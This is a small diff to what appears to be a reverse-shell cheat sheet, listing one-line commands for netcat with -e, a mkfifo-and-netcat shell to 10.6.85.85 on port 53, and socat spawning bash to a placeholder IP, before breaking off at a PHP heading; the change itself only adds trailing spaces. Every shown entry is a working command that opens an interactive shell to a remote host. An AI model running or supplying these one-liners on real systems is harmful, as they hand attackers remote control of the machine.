@@ -6,7 +6,7 @@ bash
 nc w/ -e (traditional):        
     nc -e /bin/sh 172.16.5.1 4242   
 nc openbsd (no -e):     
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f     
 socat                     
     socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
 PHP            
